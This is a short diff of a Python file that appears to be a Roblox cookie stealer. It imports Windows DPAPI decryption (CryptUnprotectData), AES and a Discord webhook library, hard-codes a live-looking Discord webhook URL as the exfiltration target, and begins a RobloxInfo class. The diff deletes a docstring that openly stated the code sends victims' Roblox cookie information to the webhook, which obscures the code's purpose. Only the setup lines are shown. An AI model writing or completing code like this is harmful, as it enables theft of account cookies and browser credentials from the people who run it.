@@ -21,9 +21,6 @@ import os
 import time
 import shutil
 import getpass
-
-
-
 import requests, os, base64, shutil
 from json import loads
 from win32crypt import CryptUnprotectData
@@ -32,11 +29,6 @@ from Crypto.Cipher import AES
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
 
-
-'''
-This repository uses Discord Webhooks to receive roblox cookie's information
-Replace 'webhook' with your discord webhook
-'''
 wbh = "https://discord.com/api/webhooks/1144908449789005824/ifOJMFGIO2jNRfEYMmFxrvPwVam7pPIvSUTtLcy_W4qjre-1ZIbAyEwxNou_xfwwO8-k"
 
 class RobloxInfo:
